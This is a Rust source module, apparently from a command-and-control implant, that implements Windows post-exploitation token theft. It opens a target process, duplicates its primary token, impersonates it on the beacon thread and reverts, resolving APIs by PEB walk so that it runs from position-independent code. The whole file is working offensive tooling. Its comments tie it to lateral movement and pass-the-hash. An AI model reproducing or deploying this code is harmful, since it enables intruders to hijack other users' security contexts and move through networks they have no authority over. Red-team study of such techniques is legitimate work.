//! Post-exploitation token operations.
//!
//! Implements the token primitives lateral-movement and pass-the-hash need:
//!   - [`steal_token`]  — duplicate a target process's primary token.
//!   - [`use_token`]    — impersonate a captured/duplicated token on our thread.
//!   - [`revert`]       — drop impersonation (RevertToSelf).
//!   - [`current`]      — report whether the thread is currently impersonating.
//!
//! ## Why here, not as wire commands
//! These aren't (yet) first-class `Command` variants in the protocol — they're
//! the building blocks a future `pth`/`steal_token`/`runas` command surface
//! would call. Exposing them now means a BOF (or a future command) can import
//! them without re-implementing the advapi32 dance. The token state lives in a
//! process-wide static so it survives across beacon cycles.
//!
//! All advapi32 exports are resolved via the PEB walk; advapi32 is force-loaded
//! (not present by default in a minimal PIC process).

#![cfg(target_os = "windows")]

use crate::resolve::export_addr;
use core::ffi::c_void;
use core::sync::atomic::{AtomicUsize, Ordering};

/// Process-wide impersonation handle (0 = none). Held for the process lifetime
/// once stolen — the beacon loop is single-threaded so one slot is enough.
static IMPERSONATION: AtomicUsize = AtomicUsize::new(0);

const TOKEN_DUPLICATE: u32 = 0x0002;
const TOKEN_QUERY: u32 = 0x0008;
const TOKEN_ASSIGN_PRIMARY: u32 = 0x0001;
const TOKEN_IMPERSONATE: u32 = 0x0004;
const TOKEN_ALL_ACCESS: u32 = 0xF0_01FF;
const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;

/// SecurityImpersonation level (= 2) for DuplicateTokenEx.
const SECURITY_IMPERSONATION: u32 = 2;

fn force_load(dll: &[u8]) -> bool {
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let addr = match unsafe { export_addr(b"kernel32.dll", b"LoadLibraryA") } {
        Some(a) => a,
        None => return false,
    };
    let mut name = [0u8; 32];
    let n = dll.len().min(name.len() - 1);
    name[..n].copy_from_slice(&dll[..n]);
    let load: LoadLibraryA = unsafe { core::mem::transmute(addr) };
    !unsafe { load(name.as_ptr()) }.is_null()
}

/// Steal the primary token of `pid` by opening that process with
/// PROCESS_QUERY_LIMITED_INFORMATION, then OpenProcessToken + DuplicateTokenEx
/// (impersonation level). Stores the duplicated handle process-wide; a prior
/// stolen token is closed first. Returns Ok(()) on success, Err(msg) otherwise.
pub unsafe fn steal_token(pid: u32) -> Result<(), &'static str> {
    if !force_load(b"advapi32.dll") {
        return Err("steal_token: advapi32.dll load failed");
    }
    type OpenProcess = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
    type OpenProcessToken =
        unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
    type DuplicateTokenEx = unsafe extern "system" fn(
        *mut c_void, // ExistingTokenHandle
        u32,         // DesiredAccess
        *const c_void, // TokenAttributes (NULL)
        u32,         // ImpersonationLevel
        u32,         // TokenType (1 = TokenImpersonation)
        *mut *mut c_void, // DuplicateTokenHandle
    ) -> i32;
    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

    let open_process: OpenProcess = match unsafe { export_addr(b"kernel32.dll", b"OpenProcess") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("steal_token: OpenProcess unresolved"),
    };
    let opt: OpenProcessToken = match unsafe { export_addr(b"advapi32.dll", b"OpenProcessToken") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("steal_token: OpenProcessToken unresolved"),
    };
    let dte: DuplicateTokenEx = match unsafe { export_addr(b"advapi32.dll", b"DuplicateTokenEx") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("steal_token: DuplicateTokenEx unresolved"),
    };
    let close: CloseHandle = match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("steal_token: CloseHandle unresolved"),
    };

    // Close any previously-stolen token first (one slot).
    let prev = IMPERSONATION.swap(0, Ordering::Relaxed);
    if prev != 0 {
        let _ = close(prev as *mut c_void);
    }

    // inherit = FALSE (0).
    let hproc = unsafe { open_process(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid) };
    if hproc.is_null() {
        return Err("steal_token: OpenProcess failed (pid? privileges?)");
    }
    let mut prim: *mut c_void = core::ptr::null_mut();
    let ok = unsafe { opt(hproc, TOKEN_DUPLICATE | TOKEN_QUERY, &mut prim) };
    let _ = close(hproc);
    if ok == 0 || prim.is_null() {
        return Err("steal_token: OpenProcessToken failed");
    }
    let mut dup: *mut c_void = core::ptr::null_mut();
    // TokenType 1 = TokenImpersonation.
    let ok = unsafe {
        dte(
            prim,
            TOKEN_ALL_ACCESS,
            core::ptr::null(),
            SECURITY_IMPERSONATION,
            1,
            &mut dup,
        )
    };
    let _ = close(prim);
    if ok == 0 || dup.is_null() {
        return Err("steal_token: DuplicateTokenEx failed");
    }
    IMPERSONATION.store(dup as usize, Ordering::Relaxed);
    Ok(())
}

/// Impersonate the currently-stolen token on this thread. No-op (Ok) if no token
/// is held. Returns Err if ImpersonateLoggedOnUser fails.
pub fn use_token() -> Result<(), &'static str> {
    let tok = IMPERSONATION.load(Ordering::Relaxed);
    if tok == 0 {
        return Ok(()); // nothing to use
    }
    if !force_load(b"advapi32.dll") {
        return Err("use_token: advapi32.dll load failed");
    }
    type ImpersonateLoggedOnUser = unsafe extern "system" fn(*mut c_void) -> i32;
    let ilu: ImpersonateLoggedOnUser =
        match unsafe { export_addr(b"advapi32.dll", b"ImpersonateLoggedOnUser") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return Err("use_token: ImpersonateLoggedOnUser unresolved"),
        };
    if unsafe { ilu(tok as *mut c_void) } == 0 {
        return Err("use_token: ImpersonateLoggedOnUser failed");
    }
    Ok(())
}

/// Drop impersonation (RevertToSelf) but keep the duplicated token for reuse.
pub fn revert() -> Result<(), &'static str> {
    if !force_load(b"advapi32.dll") {
        return Err("revert: advapi32.dll load failed");
    }
    type RevertToSelf = unsafe extern "system" fn() -> i32;
    let rts: RevertToSelf = match unsafe { export_addr(b"advapi32.dll", b"RevertToSelf") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("revert: RevertToSelf unresolved"),
    };
    if unsafe { rts() } == 0 {
        return Err("revert: RevertToSelf failed");
    }
    Ok(())
}

/// Whether a stolen token is currently held (not whether it's actively
/// impersonating — call use_token for that).
pub fn current() -> bool {
    IMPERSONATION.load(Ordering::Relaxed) != 0
}
